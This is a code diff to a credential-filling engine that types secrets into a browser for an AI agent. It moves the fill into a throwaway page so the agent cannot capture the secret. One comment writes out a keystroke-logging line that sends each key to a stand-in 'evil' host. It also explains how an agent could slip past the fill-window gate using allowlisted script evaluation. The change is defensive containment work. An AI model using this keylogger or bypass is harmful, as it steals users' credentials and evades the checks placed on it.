@@ -42,6 +42,15 @@ export type FillEngineDeps = {
   readonly gate: CdpGate;
   /** Reads the target's current generation. Bumped by navigation. */
   readonly currentGeneration: (targetId: string) => number;
+  /**
+   * The browser context the agent's target lives in.
+   *
+   * The fill happens in a throwaway target created *in that same context*, so
+   * the session cookie lands where the agent will use it — cookies belong to the
+   * context, not the target. Without this the credential would authenticate a
+   * context the agent never sees.
+   */
+  readonly browserContextOf?: (targetId: string) => string | undefined;
 };
 
 export class FillEngine {
@@ -65,20 +74,37 @@ export class FillEngine {
     gate.openFillWindow(targetId);
 
     let handle: SecretHandle | undefined;
+    let fillTarget: string | undefined;
     try {
-      // 2. Attach, and address the page the way CDP actually addresses it.
+      // 2. Type into a target the agent has never had a session on.
       //
-      // Page.navigate, DOM.querySelector and Input.insertText take no
-      // `targetId` param — an attached page is addressed by the top-level
-      // `sessionId` that Target.attachToTarget returns. Sending targetId in
-      // params was a dialect Chromium does not speak, and it is the same
-      // assumption that made the gate's fill-window check inert.
-      const sessionId = await this.#attach(targetId);
+      // Blocking CDP during the window is not enough on its own. Runtime.evaluate
+      // is allowlisted *outside* a window, so an agent can install
+      //
+      //     addEventListener('keydown', e => fetch('https://evil/?k=' + e.key), true)
+      //
+      // beforehand and read the credential as it is typed, without issuing a
+      // single CDP command while the window is open. The module doc for the
+      // policy names this exact bypass; the allowlist twelve lines below made it
+      // reachable. MutationObservers and beforeinput handlers are the same shape.
+      //
+      // A page the agent has never scripted has no listeners to fire. The cookie
+      // still lands in the shared browser context, so the agent's own page is
+      // authenticated afterwards — which is the whole point of the fill.
+      const contextId = this.#deps.browserContextOf?.(targetId);
+      fillTarget = await this.#createTarget(contextId);
 
-      // 3. The binding's URL, not the agent's.
+      // 3. Window it too, immediately. Target.getTargets and
+      //    Target.attachToTarget are both allowlisted, so an agent that notices
+      //    the new target must still be refused on it.
+      gate.openFillWindow(fillTarget);
+
+      const sessionId = await this.#attach(fillTarget);
+
+      // 4. The binding's URL, not the agent's.
       await this.#send({ sessionId, method: "Page.navigate", params: { url: grant.loginUrl } });
 
-      // 4. Navigation bumps the generation, so this catches both a page that
+      // 5. Navigation bumps the generation, so this catches both a page that
       //    moved on its own and one the agent moved underneath us.
       if (currentGeneration(targetId) !== grant.generation) {
         return { status: "aborted", reason: "generation_stale" };
@@ -88,18 +114,14 @@ export class FillEngine {
 
       // Focus first: typing into whatever happens to hold focus is how a
       // password ends up in a search box, or in the page's chat widget.
-      await this.#send({
-        sessionId,
-        method: "DOM.querySelector",
-        params: { selector },
-      });
+      await this.#send({ sessionId, method: "DOM.querySelector", params: { selector } });
 
       // Re-check after every await that could have yielded to a navigation.
       if (currentGeneration(targetId) !== grant.generation) {
         return { status: "aborted", reason: "navigated" };
       }
 
-      // 5. Borrow, type, and let `use` zero the buffer even if this throws.
+      // 6. Borrow, type, and let `use` zero the buffer even if this throws.
       const text = handle.use((bytes) => new TextDecoder().decode(bytes));
       await this.#send({ sessionId, method: "Input.insertText", params: { text } });
 
@@ -110,9 +132,34 @@ export class FillEngine {
       // A handle that was consumed but never typed — because the generation
       // moved, or the transport threw — is still live until this runs.
       handle?.dispose();
-      // 5. Always. A stuck window locks the agent out of its own browser.
+      // The throwaway target goes away with the secret it was created for.
+      if (fillTarget !== undefined) {
+        try {
+          await this.#send({ method: "Target.closeTarget", params: { targetId: fillTarget } });
+        } catch {
+          // Losing the close is untidy, not unsafe; the window below still shuts.
+        }
+        gate.closeFillWindow(fillTarget);
+      }
+      // 7. Always. A stuck window locks the agent out of its own browser.
       gate.closeFillWindow(targetId);
     }
+  }
+
+  /** Create the throwaway target the credential is typed into. */
+  async #createTarget(browserContextId: string | undefined): Promise<string> {
+    const reply = await this.#send({
+      method: "Target.createTarget",
+      params: {
+        url: "about:blank",
+        ...(browserContextId !== undefined ? { browserContextId } : {}),
+      },
+    });
+    const result = reply.result as { targetId?: unknown } | undefined;
+    if (typeof result?.targetId !== "string") {
+      throw new Error("Target.createTarget returned no targetId");
+    }
+    return result.targetId;
   }
 
   /**
